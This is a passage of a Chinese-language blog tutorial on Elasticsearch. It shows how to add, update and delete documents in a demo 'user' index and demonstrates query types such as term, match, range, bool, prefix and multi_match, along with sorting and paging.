&quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>再增加几条记录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#新增文档数据 id=2  </span><br><span class=\"line\">PUT /user/\\_doc/2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:35,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=3  </span><br><span class=\"line\">PUT /user/\\_doc/3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:19,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=5  </span><br><span class=\"line\">PUT /user/\\_doc/5  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:77,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class=\"line\">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=6  </span><br><span class=\"line\">PUT /user/\\_doc/6  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:55,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=7  </span><br><span class=\"line\">PUT /user/\\_doc/7  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:57,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>修改数据</strong></li>\n</ol>\n<p><strong>（1）操作1</strong></p>\n<p>更新数据可以使用之前的增加操作,这种操作会将整个数据替换掉，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#更新数据,id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用GET命令查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#根据ID查询  </span><br><span class=\"line\">GET /user/\\_doc/4  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）操作2</strong></p>\n<p>我们先使用下面命令恢复数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#恢复文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用POST更新某个列的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#使用POST更新某个域的数据  </span><br><span class=\"line\">POST /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;doc&quot;:&#123;  </span><br><span class=\"line\">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>删除Document</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#删除数据  </span><br><span class=\"line\">DELETE user/userinfo/7  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-数据查询\"><a href=\"#4-2-数据查询\" class=\"headerlink\" title=\"4.2 数据查询\"></a>4.2 数据查询</h2><ol>\n<li><strong>查询所有数据</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询所有  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>根据ID查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#根据ID查询  </span><br><span class=\"line\">GET /user/\\_doc/2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>Sort排序</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#搜索排序  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>分页</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#分页实现  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;from&quot;: 0,  </span><br><span class=\"line\">  &quot;size&quot;: 2  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>from:从下N的记录开始查询</p>\n</li>\n<li><p>size:每页显示条数</p>\n</li>\n</ul>\n<h2 id=\"4-3-查询模式\"><a href=\"#4-3-查询模式\" class=\"headerlink\" title=\"4.3 查询模式\"></a>4.3 查询模式</h2><ol>\n<li><strong>term查询</strong></li>\n</ol>\n<p>term主要用于分词精确匹配，如字符串、数值、日期等（不适合情况：1.列中除英文字符外有其它值 2.字符串值中有冒号或中文 3.系统自带属性如_version）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询-term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;term&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>terms 查询</strong></li>\n</ol>\n<p>terms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 如果某个字段指定了多个值，那么文档需要一起去做匹配 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询-terms 允许多个Term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;terms&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:  </span><br><span class=\"line\">        \\[  </span><br><span class=\"line\">          &quot;武汉&quot;,  </span><br><span class=\"line\">          &quot;广州&quot;  </span><br><span class=\"line\">        \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>match查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>query_string查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;query\\_string&quot;: &#123;  </span><br><span class=\"line\">      &quot;default\\_field&quot;: &quot;city&quot;,  </span><br><span class=\"line\">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>range 查询</strong></li>\n</ol>\n<p>range过滤允许我们按照指定范围查找一批数据。例如我们查询年龄范围</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#-range 范围过滤  </span><br><span class=\"line\">#gt表示&gt; gte表示=&gt;  </span><br><span class=\"line\">#lt表示&lt; lte表示&lt;=  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;range&quot;: &#123;  </span><br><span class=\"line\">      &quot;age&quot;: &#123;  </span><br><span class=\"line\">        &quot;gte&quot;: 30,  </span><br><span class=\"line\">        &quot;lte&quot;: 57  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>exists</strong></li>\n</ol>\n<p>exists 过滤可以用于查找拥有某个域的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#搜索 exists：是指包含某个域的数据检索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;exists&quot;:&#123;  </span><br><span class=\"line\">      &quot;field&quot;:&quot;address&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><strong>bool 查询</strong></li>\n</ol>\n<p>bool 可以用来合并多个条件查询结果的布尔逻辑，它包含以下操作符：</p>\n<ul>\n<li><p>must : 多个查询条件的完全匹配,相当于 and。</p>\n</li>\n<li><p>must_not : 多个查询条件的相反匹配，相当于 not。</p>\n</li>\n<li><p>should : 至少有一个查询条件匹配, 相当于 or。</p>\n</li>\n</ul>\n<p>这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#过滤搜索 bool   </span><br><span class=\"line\">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class=\"line\">#must\\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class=\"line\">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;must&quot;: \\[  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;term&quot;: &#123;  </span><br><span class=\"line\">            &quot;city&quot;: &#123;  </span><br><span class=\"line\">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;,  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">          &quot;range&quot;:&#123;  </span><br><span class=\"line\">            &quot;age&quot;:&#123;  </span><br><span class=\"line\">              &quot;gte&quot;:20,  </span><br><span class=\"line\">              &quot;lte&quot;:99  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li><strong>match_all 查询</strong></li>\n</ol>\n<p>可以查询到所有文档，是没有查询条件下的默认语句。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询所有 match\\_all  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>match 查询</strong></li>\n</ol>\n<p>match查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#字符串匹配  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>prefix 查询</strong></li>\n</ol>\n<p>以什么字符开头的，可以更简单地用 prefix ,例如查询所有以张开始的用户描述</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#前缀匹配 prefix  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;prefix&quot;: &#123;  </span><br><span class=\"line\">      &quot;name&quot;: &#123;  </span><br><span class=\"line\">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>multi_match 查询</strong></li>\n</ol>\n<p>multi_match查询允许你做match查询的基础上同时搜索多个字段，在多个字段中同时查一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#多个域匹配搜索  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;multi\\_match&quot;: &#123;  </span><br><span class=\"line\">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class=\"line\">      &quot;fields&quot;: \\[  </span><br><span class=\"line\">        &quot;city&quot;,  </span><br><span class=\"line\">        &quot;description&quot;  </span><br><span class=\"line\">      \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>filter</strong></li>\n</ol>\n<p>因为过滤可以使用缓存，同时不计算分数，通常的规则是，使用查询（query）语句来进行 全文 搜索或者其它任何需要影响 相关性得分 的搜索。除此以外的情况都使用过滤（filters)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;bool&quot;: &#123;  </span><br><span class=\"line\">      &quot;filter&quot;: &#123;  </span><br><span class=\"line\">         &quot;range&quot;:&#123;  </span><br><span class=\"line\">          &quot;age&quot;:&#123;  </span><br><span class=\"line\">            &quot;gte&quot;:25,  </span><br><span class=\"line\">            &quot;lte&quot;: 80  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>完整DSL案例代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/health?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/nodes?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\">  </span><br><span class=\"line\">DELETE /user  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_mapping  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;properties&quot;: &#123;  </span><br><span class=\"line\">    &quot;name&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;city&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;description&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:22,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=2  </span><br><span class=\"line\">PUT /user/\\_doc/2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:35,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=3  </span><br><span class=\"line\">PUT /user/\\_doc/3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:19,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=5  </span><br><span class=\"line\">PUT /user/\\_doc/5  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:77,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class=\"line\">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=6  </span><br><span class=\"line\">PUT /user/\\_doc/6  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:55,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=7  </span><br><span class=\"line\">PUT /user/\\_doc/7  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:57,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_doc/4  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">#更新数据,id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#使用POST更新某个域的数据  </span><br><span class=\"line\">POST /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;doc&quot;:&#123;  </span><br><span class=\"line\">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">  </span><br><span class=\"line\">GET /user/\\_doc/2  </span><br><span class=\"line\">  </span><br><span class=\"line\">#搜索排序  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#分页实现  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  